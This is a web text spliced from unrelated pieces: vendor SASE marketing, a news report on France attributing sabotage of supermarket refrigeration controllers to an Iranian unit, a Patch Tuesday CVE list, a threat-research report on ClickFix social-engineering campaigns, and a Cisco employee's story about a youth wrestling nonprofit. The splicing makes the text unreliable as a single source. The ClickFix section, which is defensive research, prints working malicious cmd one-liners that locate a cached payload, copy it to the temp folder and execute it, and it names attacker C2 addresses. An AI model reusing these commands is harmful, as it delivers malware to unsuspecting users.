Reducing the Work of Managing Separate Systems

The 59% reduction in operational effort helps explain how the modeled returns are achieved. Fortinet Unified SASE unifies the SD-WAN edge and cloud-delivered SSE on a common FortiOS operating system, with unified management and a shared data lake. This architecture enables teams apply consistent policies and investigate issues without switching between disconnected tools.

Customer interviews illustrate the practical impact. General network and security administration produced the greatest absolute time savings. Remote access management became simpler when zero-trust network access replaced legacy VPN deployments. One customer cut the time to bring a site online from about a month to just days, and reduced acquisition integration from as long as three months to about three to four weeks.

Customers also reported that a single console made compliance reporting simpler. For organizations in regulated sectors, spending less time gathering and reconciling information can free staff to focus on other security and operational priorities.

Vendor and platform consolidation accounts for another 12% of modeled benefits by reducing licenses, simplifying procurement, and decreasing the number of vendor relationships to manage. Faster integration also helps acquired organizations start using shared systems sooner.

Improving Productivity and Resilience

End-user productivity accounts for 25% of modeled benefits. One healthcare customer reported that doctors had previously lost reliable connectivity after about three hours of work; deployment resolved the issue. Education customers reported fewer connectivity complaints from users on campus, at home, and while traveling.

Improved resilience contributes an additional 11% to the modeled benefits. One customer replaced a single internet connection with two connections and SD-WAN failover. For a clinic or school that depends on continuous application access, this can reduce disruption if a connection fails.

Supporting AI Adoption with Consistent Controls

The report also frames these findings against rising infrastructure demands. Omdia survey data cited in the report show that 80% of organizations are investing in AI infrastructure, while 69% say their environments have grown more complex over the past two years.

One interviewee described a related visibility issue: Before deployment, the organization didn’t know who was using AI tools or what data employees were entering into them. Consolidating generative AI access security, data loss prevention, and cloud access security broker capabilities together on one platform helps teams govern usage and protect sensitive information. These controls are especially relevant in government and healthcare, where employees handle regulated data.

Using Connectivity Savings to Support Modernization

Network and security cost optimization represents the largest category of benefits in Omdia’s model. One customer replaced MPLS circuits that cost roughly $2,000 with cable connections costing about $150, while gaining more than 30 times the bandwidth.

Savings at that scale can help fund broader modernization. By pairing connectivity changes with networking and security consolidation, organizations can assess the transition's costs alongside the operational and security benefits of the resulting architecture.

Applying These Findings to Your Organization

While the composite enterprise is large, the issues it addresses also affect smaller organizations. A small IT team managing multiple consoles and contracts can benefit from consolidation, and connectivity costs can be evaluated on a per-site basis. The study’s percentage reductions provide useful benchmarks for that assessment, though smaller organizations should not assume equivalent returns.

The next step is to build a business case using your organization’s cost data. Compare current circuit and licensing expenses, factor in the time spent managing separate systems, and include migration and deployment costs. A proof of concept can then validate operational improvements and the user experience before a broader rollout.

Download The Economic Benefits of Fortinet Unified SASE to explore the findings.

An October cyberattack on refrigeration controllers at about 700 French retail sites was carried out by a cyber unit of Iran's Islamic Revolutionary Guard Corps (IRGC), the French government said yesterday.

The attackers broke into controllers on the night of October 11 and changed their defrost settings to high temperatures. That caused food losses and, in at least 15 cases, fires.

The unit is called Shahid Kaveh. It is known mainly through hacktivist personas, such as CyberAveng3rs and Cyber Isnaad Front, that publicly claim some of its attacks, France says.

France's Foreign Ministry plans to summon Iran's ambassador and to ask its European partners to adopt new sanctions against Iranian organizations and individuals involved in the attack.

The Paris prosecutor's office opened a judicial investigation yesterday against the unit's head, the head's two deputies and anyone else identified. It has asked for international arrest warrants. The offenses under investigation include illegally interfering with computer systems and causing damage by means dangerous to people, both made more serious by the aim of serving a foreign power, Iran.

In the October attack, the attackers took remote control of Danfoss and Dixell refrigeration controllers through web interfaces, the prosecutor's office said in a press release. They started abnormal defrost cycles with no time limit and switched off the temperature probes' safety alerts, which should go off above a certain temperature. The attack caused about 20 fires.

Most of the organizations hit were large retailers, according to a joint report by France's cyber crisis coordination center, known as C4. They include Casino, Leclerc, Coopérative U, Metro, Carrefour and Intermarché.

Small butcher shops, a slaughterhouse and cooperative food plants were also among the victims.

The center also tied the attack to the simultaneous targeting of Schneider Electric equipment at several small hydroelectric installations in France. The effects on that equipment were moderate.

In its attribution statement, the ministry estimated the food losses at several tens of millions of euros and called the operation the first offensive cyber campaign on French soil carried out purely for sabotage.

How France Tied the Attack to Iran

The C4 brings together France's national cybersecurity agency (ANSSI), the DGSE and DGSI security services, the armament directorate and the cyber defense command. It says four indicators point to the IRGC as the sponsor of the attack and to Shahid Kaveh as the unit that carried it out.

The infrastructure used in the attack was also used during the same period for reconnaissance of Schneider Electric equipment. That equipment is installed at sites such as small- and medium-sized energy and water production sites. The reconnaissance relied on techniques that Shahid Kaveh has used since at least April.

The attackers also used FOFA, a scanning tool they usually use. CyberbanNews, a propaganda outlet linked to the unit, reported on the attack as early as October 13. The attack infrastructure also held traces of Persian.

Prosecutors said the criminal investigation, run by France's anti-cybercrime office (OFAC) and the DGSI, found an attack method typical of the unit. It also found the use of Persian and IP addresses leading to devices located in Iran.

Shahid Kaveh has previously claimed attacks on industrial equipment, according to C4. Through CyberAveng3rs, it claimed an earlier campaign against Unitronics, an Israeli company that makes industrial control systems, in November 2023. In March and April, it claimed a large sabotage campaign against Israeli and U.S. interests that hit industrial control equipment, including Israeli refrigeration equipment.

France's attribution does not mention the new wave of refrigeration attacks that struck supermarkets in several other European countries last week.

What Operators Should Do

France's CERT-FR said in an incident alert that it was aware of numerous compromises affecting remote refrigeration controllers across four product families. They are the Danfoss AK-SM and AK-SC series, the Copeland xweb, and the Dixell xweb.

The alert, last updated on October 16, warned that attack campaigns against this equipment were probably still underway, and that exposing a management interface to the internet goes against good practice.

For controllers that are not compromised, the alert's steps are:

Remove internet exposure from these units and from any unit reachable at a public IP address.

Check insurance contract terms before cutting off the data feed to the refrigeration contractor.

Review the full configuration, especially the defrost ranges.

Restore access only through a secure VPN or a protected network. In an emergency, filtering the contractors' IP addresses at a firewall is possible, but it is not a lasting fix.

Follow the maker's recommended practices. For Danfoss devices, this includes updating firmware, setting the security level to Strict, and ensuring default passwords have been changed.

For compromised controllers, the steps are:

Remove internet exposure and check insurance terms, as above.

Restart Danfoss equipment, or otherwise restore the device to its factory settings.

Restore access only through a secure VPN or a protected network. As above, firewall filtering of contractors' IP addresses is an emergency option, not a lasting fix.

Reconfigure the device before putting it back into service, then follow the maker's recommended practices.

An end-of-life (EOL) device that receives no security fixes faces a very high risk of compromise if it remains exposed to the internet, the alert warns. In that case, a factory reset alone is not enough: it removes the attackers' persistence, but the device stays vulnerable and will almost certainly be compromised again.

Elevation of Privilege (EoP) vulnerabilities accounted for 48.9% of the vulnerabilities patched this month, followed by remote code execution (RCE) vulnerabilities at 27.1%.

Moderate

CVE-2026-124194 | Microsoft Outlook spoofing vulnerability

CVE-2026-124194 is a spoofing vulnerability in Microsoft Outlook. It received a CVSSv3 score of 6.5 and is rated moderate. An attacker could exploit this vulnerability by convincing a target to open a crafted Microsoft Office file. Successful exploitation would allow an attacker to obtain the target’s valid NTLMv2 hash, which can then be used to impersonate that user in follow-on attacks.

According to Microsoft, this vulnerability was exploited in the wild as a zero-day. Additionally, the advisory credits this discovery to a security researcher that used Claude, the large language model (LLM) from Anthropic, though no specific version of Claude was noted in the advisory.

Critical

CVE-2026-118146 | Windows Active Directory Domain Services remote code execution vulnerability

CVE-2026-118146 is an RCE vulnerability affecting Windows Active Directory Domain Services. It received a CVSSv3 score of 8.8 and is rated as critical. An authenticated attacker could exploit an incorrect authorization in Active Directory Domain Services to execute code over a network. Successful exploitation would allow an attacker to execute arbitrary code on the affected system. It was assessed as “Exploitation More Likely.”

Important

CVE-2026-120002 | Microsoft SharePoint Server elevation of privilege vulnerability

CVE-2026-120002 is an EoP vulnerability affecting Microsoft SharePoint Server. It received a CVSSv3 score of 9.9 and is rated as important. An authenticated attacker could exploit an incorrect authorization in Microsoft Office SharePoint to elevate privileges over a network. Successful exploitation would allow an attacker to gain elevated privileges. It was assessed as “Exploitation Less Likely.”

Critical

CVE-2026-118207 | Microsoft Exchange Server remote code execution vulnerability

CVE-2026-118207 is an RCE vulnerability affecting Microsoft Exchange Server. It received a CVSSv3 score of 8.8 and is rated as critical. An authenticated attacker could send malformed input to Microsoft Exchange Server, causing code to execute over a network. Successful exploitation would allow an attacker to execute arbitrary code on the affected system. It was assessed as “Exploitation More Likely.”

Critical

CVE-2026-119952 | Windows Schannel remote code execution vulnerability

CVE-2026-119952 is an RCE vulnerability affecting Windows Schannel. It received a CVSSv3 score of 8.1 and is rated as critical. An unauthenticated attacker could exploit an observable timing discrepancy in Windows Schannel to execute code over a network. Successful exploitation would allow an attacker to execute arbitrary code on the affected system. It was assessed as “Exploitation More Likely.”

Acknowledgments: Special thanks to Nick Roddy and Lindsey Welch for their contributions to this investigation and writeup.

Background

Threat actors love ClickFix, a tactic most commonly known for tricking users into executing commands that download malicious scripts, loaders, or infostealers. Although this social engineering trick has been around for a while, threat actors continue to find new ways to utilize it. Just since early August, we've published blogs about the following:

A ClickFix campaign that mimics Amazon and calls the finger utility

Custom GPTs funneling targets to ClickFix lures

A ClickFix-style prompt to "decrypt" a Google Doc

A macOS-focused campaign using a ClickFix lure to determine what payload to deliver

This is just a taste of the ClickFix tradecraft we've seen in recent months. For instance, we've recently been seeing it used as an initial access step leading to lateral movement. We've also seen it use browser-cache-seeded delivery chains, deliver remote access trojans (RAT) that utilize node.js, and even reconstruct executable payloads from data hidden in image files. Not only that, but we continue to track interesting trends in the way ClickFix has been initially delivered.

This isn't the first time we've taken a broader look at ClickFix tradecraft, and it probably won't be the last. Consider this a snapshot of what we're currently seeing "beyond the clipboard," so to speak.

Delivery through malvertising

Several recent ClickFix campaigns leverage malvertising, attempting to lure their targets to malicious landing pages. This may not be new, but it is nevertheless important to stay vigilant. The pages are often hosted on attacker-controlled infrastructure, but we have also seen threat actors leverage cloud-based services to circumvent detection.

Typosquatting

One recent incident started when a user performed a Bing search for "Westlaw," a popular legal research service for lawyers, and clicked on a paid ad in the results. While the page is no longer active, logs show that the link redirected to a typosquatted domain https://vvestalw.ghost[.]io and a page titled "Westlaw - Legal Research Platforms | Thomson Reuters." After a couple of redirects (included in the IOCs section below) the user was brought to a fake site at https[:]//westlaw-signon[.]com, designed to look like the real site on the Thomson Reuters domain, and presented a standard ClickFix workflow.

SEO poisoning

Another campaign that we have seen attempts to trick users searching for LinkedIn, or alternatively real estate, to visit the threat actor's site instead.

Figure 1: Sponsored search ad leading to a spoofed LinkedIn site.

Upon visiting the site, the user is presented with what looks like a Cloudflare "Verify that you are human" turnstile. Checking the checkbox initiates the ClickFix process.

Figure 2: Fake "Verify that you are human" turnstile.

Compromised websites

In other campaigns the initial presentation is even more polished, as is the case with this example of a dental practice website that was temporarily compromised with ClickFix, discovered by Huntress security researcher John Hammond.

Figure 3: Compromised dental site with Manage Consent controls that launches a fake verification.

The page included your typical Manage Consent pop-up, which was actually used as part of the lure. If the user clicked Accept—or clicked anywhere for that matter—they were presented with a fake Cloudflare "Verify that you are human" turnstile.

Figure 4: Another example of a fake "Verify you are human" turnstile.

PowerShell-based fake verifications

If a user checks the box in any of these fake "verify that you are human" turnstiles, ClickFix instructions are presented, similar to the following.

Figure 5: ClickFix instructions.

A PowerShell command is put into the clipboard at this point, containing malicious instructions. However, we've recently noticed attackers including some form of output that the user will see that makes it appear as though a verification process is taking place. These fake verification messages likely reassure the target that the command they just pasted is doing what the page promised, drawing further attention away from the malicious activity by presenting what appears to be part of a legitimate security check.

For example, some ClickFix campaigns open a terminal and display messages, with colored text, that make it appear as though a verification process is underway. However, what's actually happening is the payload is being downloaded and executed.

Figure 6: Examples of fake verification messages displayed in the terminal.

Some PowerShell even includes alternate messages. For instance, if a check for the presence of the payload at the end of the command fails, it displays an error. This may be designed to convince the user to try downloading it again, if for whatever reason the command didn't work.

Figure 7: PowerShell command showing the message displayed if the download check fails.

A message in a terminal is one thing, but some ClickFix commands go far further. In the case of the compromised dental site above, the copied PowerShell included an elaborate script to create a window that presented a detailed series of "checks," along with animated progress bars that turned green when complete.

Figure 8: Fake Cloudflare Security Challenge built entirely from pasted PowerShell ClickFix command.

Payloads

ClickFix is still most often associated with a simple outcome: a user executes a command that downloads a script, loader, or infostealer. But recent incidents have shown that the technique can lead to much more varied payloads.

That variety shows up in two areas—what ClickFix delivers and what attackers do with the foothold it creates. The technique can deliver different types of malware, help attackers establish persistence and expand access across an environment, or serve as the first stage in a more complex delivery chain.

Not an RMM? RATs

While ClickFix attacks often deliver infostealers and loaders, Huntress has occasionally observed remote access trojans (RATs) delivered as the final payload. For instance, one of the campaigns mentioned above abused ChatGPT's Custom GPT feature to trick users into downloading a Windows MSI installer that drops a custom RAT.

In another ClickFix campaign that relied on an MSI installer, the final payload masqueraded as a remote monitoring and management (RMM) tool dubbed DuskDesk—a possible nod to RustDesk, an open source RMM. However, DuskDesk is actually a Node.js-based RAT.

In two incidents investigated by Huntress, an MSI package from apirequestaccess[.]com installed a Node.js wrapper into the user's AppData directory to launch malicious JavaScript (LimeMint.js).

Along with spawning PowerShell for system fingerprinting, the malware established persistence by creating a user Run key named "DuskDesk" that executes node.exe with launch.js at every user logon.

While DuskDesk might be mistaken for a legitimate RMM in the user's environment, active connections revealed that node.exe established a TCP connection to the remote IP address 167.148.201[.]104 on port 3861, potentially enabling the attacker to establish command-and-control (C2) capability.

While similar tradecraft has been reported elsewhere, the incidents we investigated feature evolved tradecraft, including a more configurable DAT file and the addition of wrapped PowerShell commands.

Lateral movement to the domain controller

We've seen instances of lateral movement where threat actors used ClickFix to deliver a loader that pulled down a RAT, enabling them to jump to another system. These threat actors established a foothold, eventually using built-in tools to move laterally.

In one incident back in February, a ClickFix prompt led to the installation of the Matanbuchus 3.0 loader and then AstarionRAT. The operator used this RAT to perform reconnaissance, steal credentials, and eventually use PsExec to hop to a Windows Server and two domain controllers.

In a separate incident in May, a ClickFix attack against an unmonitored endpoint led to the installation of the Potemkin loader, RMMProject, and EtherRAT. SMBExec was used to deploy the malware through administrative shares, compromising 11 hosts before it was stopped.

Unlike these two examples, an incident in early September did not rely on a dedicated RAT as its primary foothold. Instead, the threat actor leveraged a lightweight execution and persistence chain using native Windows administration protocols to move from an initial endpoint to the domain controller and then create a reverse SSH tunnel.

The ClickFix command in this incident downloaded a ZIP file named cf_verify.zip into the user's Temp folder, created a folder named C:\ProgramData\f8f33b09aed97a47, and extracted the contents of the ZIP file to it, which created the following files:

1.bat

CertEnrollCtrl.exe

CertEnroll.dll (a malicious DLL used for DLL sideloading)

It then executed 1.bat, which created a user Run key and a scheduled task (both named CertEnrollCtrl_Y0db6oZq9) to run CertEnrollCtrl.exe. This executable uses the Windows Command Shell to launch a PowerShell script that performs Active Directory reconnaissance using multiple native Windows utilities:

nltest.exe to enumerate domain trust relationships and identify domain controllers

net.exe to query Domain Admins group membership and user account details

whoami.exe to identify the current user context

findstr.exe to filter command output for OS and network-configuration details

Several more files were added to the Temp folder, including a TXT file (%LocalAppData%\Temp\6341434163416441.txt) that contained a Base64-encoded PowerShell command that does the following:

Defines a working folder C:\ProgramData\ShService and drops an SSH private key into it

Sets up a reverse SSH tunnel and connects to attacker-controlled infrastructure located at 23.227.199[.]41

Creates a scheduled task named SysyService

Next, the attacker used WinRM to laterally move to the primary domain controller. Once access was obtained, the attacker created a new user account and attempted to add it to the local administrators group. They then created a second reverse SSH tunnel using the same PowerShell script described above.

Steganographic delivery chains

In another interesting incident, we observed a ClickFix steganographic delivery chain in which a user-executed command initiated a multi-stage attack that reconstructed executable payloads from data that was hidden inside PNG files.

This isn't the first time we've seen ClickFix leverage steganographic techniques, though there are some differences this time. The threat actors in the earlier incident hid shellcode instructions within images; this time it's full-blown executables.

The PowerShell copied via ClickFix triggered a fake Cloudflare verification inside a terminal window, similar to what has been described above. While displaying the fake verification, the PowerShell script dropped a compressed archive named verify_pkg.zip into the victim's C:\Users\user\AppData\Local\Temp\ folder. The command then unpacked this archive and placed a legitimate, signed Microsoft binary (LockScreenContentServer.exe) into C:\ProgramData\7168f7f870a45fbb\. Accompanying this trusted executable was a rogue DLL and a batch file named 1.bat.

The 1.bat file was then launched through cmd.exe, and served as a multi-stage PowerShell stager. To evade traditional network monitoring and file-based security controls, this stager relied on steganography. It retrieved benign-looking PNG image files that secretly contained embedded executable binaries within their pixel data. The PowerShell script extracted these hidden payloads, reconstructed the malicious binaries on disk, and executed them.

With the payload successfully reconstructed, the malware established persistent background execution by creating a scheduled task, as well as a Run key in the registry. These steps provided the threat actor with remote access to further their attack.

Cache me if you can

A recent investigation conducted by John Hammond uncovered an attack that varied its actions based on the browser in use in order to carry out a browser-cache-seeded delivery chain designed to deliver a whole trove of malware.

This is actually the compromised dental site mentioned previously, but to quickly recap, if a user clicked on the Manage Consent dialog box, a "Verify you are human" turnstile appeared. This led to a ClickFix attack that created a window with progress bars displaying fake network checks.

Figure 9: Compromised dental site previously discussed.

Early on, a check takes place to determine what browser the target is using. This check ultimately determines the ClickFix command that is served up to the user. For example:

Firefox:cmd /c for /r "%LOCALAPPDATA%\Mozilla\Firefox\Profiles" %f in (f_*) do @if %~zif==17635 copy "%f" %TEMP%\t.bat >nul 2>nul&%TEMP%\t.bat

Chrome:cmd /c for /r "%LOCALAPPDATA%\Google\Chrome\User Data" %f in (f_*) do @if %~zif==17635 copy "%f" %TEMP%\t.bat >nul 2>nul&%TEMP%\t.bat

Brave:cmd /c for /r "%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data" %f in (f_*) do @if %~zif==17635 copy "%f" %TEMP%\t.bat >nul 2>nul&%TEMP%\t.bat

The only difference between these commands is the folder location it points to for each browser's cache. Regardless of the browser, each command iterates through the files in the cache, looking for one that is 17,635 bytes in size.

It turns out that when the fake dental side was initially loaded, a 17,635-byte file was included and saved into the cache. When the ClickFix command finds this file, it copies it to the Temp folder as a batch file and executes it. This results in several stage two payloads, with one PowerShell file in turn calling several more malicious payloads.

Combating ClickFix

As we said at the beginning, attackers love ClickFix. Its prevalence as an attack technique leaves little doubt of this, and the fact that threat actors continue to come up with new and novel ways to utilize it only drives the point home.

It doesn't appear that these newer uses for ClickFix are part of one group's attempt to further the technique. Rather, unconnected threat actors or groups have observed how successful ClickFix has been in tricking targets and are experimenting with new ways to leverage it.

Fortunately, there are several things that can be done to combat ClickFix attacks.

Stop the paste

At its core, ClickFix is a social engineering attack mechanism, designed to take advantage of less technical or informed users. Combatting this requires user training to recognize ClickFix lures.

Train users to never paste commands into a Run dialog box, a terminal, PowerShell, or anything else at a web page's request. Emphasize that legitimate CAPTCHAs or "verification" workflows never require you to execute shell commands. Finally, encourage users to report suspicious pages to their Security or IT departments.

Control what can execute

In parallel, it's important to harden script and application execution on the endpoint. Utilize application control tools or allowlisting for untrusted executables. Block the execution from user-writable locations like the Temp folder and implement controls for unsigned binaries and suspicious archive extraction. Finally, limit the access to local administrator privileges, as well as opening the Run dialog box or a command prompt.

Detect the chain

Even with user training and endpoint controls in place, organizations should monitor for the behaviors that follow a successful ClickFix execution:

A browser or user-launched process spawning cmd.exe, PowerShell, or Windows Terminal

Encoded PowerShell commands

Execution-policy bypasses

Archives or executables appearing in user-writable locations

Detection should also extend beyond initial execution. New scheduled tasks, new Run keys, or unexpected SSH connections can all indicate that something is amiss. Because payloads and file names can change, defenders should focus on the sequence of activity rather than relying solely on hashes, domains, or other static indicators.

When I was six years old, my father left our family. I was the youngest of four kids, and suddenly my mom — with only a high school diploma, no job, and no child support — was faced with raising four children alone.

A year later, Coach Weir recognized I was a kid who needed direction and introduced me to wrestling. He drove me to tournaments up and down the East Coast, pushed me academically, and encouraged me to make good choices. Wrestling eventually took me to Rutgers University, where I competed at the Division I level and became team captain.

But Coach Weir’s greatest gift wasn't wrestling. He gave me an opportunity and showed me what happens when someone invests in another person.

“Culture is our operating system”

Wrestling taught me that success comes from fundamentals practiced consistently: Preparation, accountability, resilience, integrity, and continuous improvement.

Those lessons followed me to Cisco, where I lead the global team responsible for our Wells Fargo relationship.

The C2X Academy creates a community where mentors build leaders, one student at a time.

We've learned that great doesn’t happen by accident. Culture is our operating system.

Our team follows 33 fundamentals called The Cisco/Wells Fargo Way. Each week, a teammate from somewhere around the globe shares their personal story and what that week's fundamental means to them.

Suddenly, a colleague thousands of miles away becomes more than a name on a Webex screen. We build trust, understand one another, and become more invested in each other’s success.

We share these stories with Wells Fargo colleagues, too. What started as an internal initiative has become part of how we strengthen customer relationships and differentiate ourselves as a partner.

That same philosophy lives at C2X

In 2014, two partners and I opened C2X — Commitment 2 Excellence Wrestling Academy — in a 2,400-square-foot warehouse in Fort Mill, South Carolina.

Like Cisco, we've made culture intentional. Our 24 fundamentals, The C2X Way, include: Listen Generously, Walk in Others' Shoes, Assume Positive Intent, and Practice Blameless Problem-Solving.

Today, C2X is a nonprofit where 10 former collegiate wrestlers coach and mentor more than 200 young people annually. Beyond wrestling, we provide academic support, college recruiting guidance, mentorship, and scholarships for families in need.

The impact goes far beyond the wrestling mat.

Two former wrestlers dreamed of becoming firefighters. We connected them with a C2X family member who leads Charlotte Fire Academy. Today, both serve their communities as firefighters.

Tim (left) with C2X partners Tom Tanis, previous Division I All-American at Rutgers, and Vas Lahanas, a former NCAA qualifier at the University of Maryland.

Another graduated from the University of Virginia after we helped negotiate $250,000 in wrestling scholarship support. He’s now preparing for medical school.

And two young men who attended our first practice in 2014 returned after successful Division I wrestling careers. Today, they’re C2X coaches, investing in the next generation.

The ripple effect

We're now preparing to open a state-of-the-art facility, expanding our reach to approximately 350 young people annually. I'm especially proud that Cisco will support this next chapter with technology to help our athletes train, study, learn, and thrive. CX2 has also been accepted into Benevity, Cisco’s matching gift program.

When I walk into C2X, I think about looking into the stands and always finding my mom. And I remember Coach Weir making room in his car for one more kid.

Neither could have imagined where those sacrifices and acts of kindness would lead. But I see it now.

It’s the culture I strive to create at C2X and the culture we've built with our Cisco/Wells Fargo team: Give someone an opportunity. Believe in them. Help them become more than they thought they could be.

Then, watch the ripple effect continue.

You may also like…

Discover how a culture of support helped James Lovell scale his career at the biggest company you’ve never heard of.

How Laura Tinnelly helped build Cisco’s AI Presentation Coach, proving anyone can innovate.

Monica Naim shares her journey from homelessness to Cisco and how Sleep Out helps youth find hope and stability.
